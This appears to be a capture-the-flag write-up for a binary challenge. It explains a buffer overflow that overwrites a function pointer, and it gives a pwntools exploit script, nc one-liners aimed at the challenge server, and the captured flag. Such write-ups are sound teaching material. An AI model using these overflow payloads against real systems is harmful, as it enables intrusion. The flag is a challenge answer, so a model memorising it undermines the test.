# Cyberphobia: Overflowed Bits

 *Binrev — 50 points*

> I can't trust computers anymore. I trusted the input, it overflowed.

I was handed a toy binary `main` (with source) and a service at `nc 18.226.103.146 1337`. Flag format `spooky{response_from_server}` — whatever the server coughs up is the flag.

## Looking at the binary

First thing, the protections:

```bash
file ./main
readelf -h ./main | grep -E "Type|Machine"
nm ./main | grep -iE "corn_maze_exit|center_of_corn_maze|vuln|main"
readelf -l ./main | grep -iE "GNU_STACK|GNU_RELRO"
```

Everything is in my favour:

- **Non-PIE** (`ET_EXEC`) — addresses are fixed and known at compile time, no leak needed.
- **No stack canary** — nothing guards the overflow.
- There's a win function **`corn_maze_exit`** that opens `secret.txt` and prints it, sitting at a fixed **`0x4011d6`**.

## The bug

`vuln()` uses a struct where a `char buf[64]` is immediately followed by a function pointer:

```c
struct {
    char buf[64];
    void (*direction)(void);
} s;

s.direction = center_of_corn_maze;   // the "try again" loop
read(0, s.buf, 128);                 // writes 128 bytes into a 64-byte buffer
s.direction();                       // calls whatever direction now points to
```

`read` happily writes **128 bytes into a 64-byte buffer**. The 64 bytes right after `buf` land exactly on `direction` — and that pointer is called immediately after. Textbook "trust the input" overflow: I overflow the buffer and redirect the call.

## The exploit

Fill the 64 bytes, then overwrite the pointer with the win function's address:

```
payload = b"A"*64 + p64(0x4011d6)
```

Confirmed locally — the overflow redirects execution into `corn_maze_exit`, which prints the secret.

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = "18.226.103.146", 1337
CORN_MAZE_EXIT = 0x4011d6        # non-PIE, fixed address

payload  = b"A" * 64             # fill char buf[64]
payload += p64(CORN_MAZE_EXIT)   # overwrite the function pointer

io = remote(HOST, PORT)
io.recvuntil(b"direction: ")
io.send(payload)                 # read(0, buf, 128) — no newline needed
print(io.recvall(timeout=5).decode(errors="replace"))
```

No pwntools? A one-liner does the same:

```bash
python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+(0x4011d6).to_bytes(8,"little"))' | nc 18.226.103.146 1337
```

If `nc` tears down before the reply lands, keep the pipe open a beat:

```bash
{ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*64+(0x4011d6).to_bytes(8,"little"))'; sleep 2; } | nc 18.226.103.146 1337
```

The `secret.txt` the server prints is the flag.

🚩

```flag
spooky{br4v3Se@O77er}
```
